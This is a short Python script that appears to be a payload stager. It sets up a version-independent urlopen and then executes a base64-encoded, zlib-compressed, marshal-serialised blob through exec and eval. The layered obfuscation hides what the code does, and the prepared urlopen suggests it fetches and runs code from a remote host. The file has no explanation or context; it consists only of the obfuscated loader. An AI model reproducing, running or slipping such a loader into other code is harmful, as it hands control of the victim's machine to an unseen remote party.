import sys,zlib,base64,marshal,json,urllib
if sys.version_info[0] > 2:
    from urllib import request
urlopen = urllib.request.urlopen if sys.version_info[0] > 2 else urllib.urlopen
exec(eval(marshal.loads(zlib.decompress(base64.b64decode(b'eJwrtWZgYCgtyskvSM3TUM8oKSmw0tc3MjTTs9QzMjLRMzQ0tjI0NrbQ1y8uSUxPLSrWryrI0CuoVNfUK0pNTNHQBABBGxJJ')))))
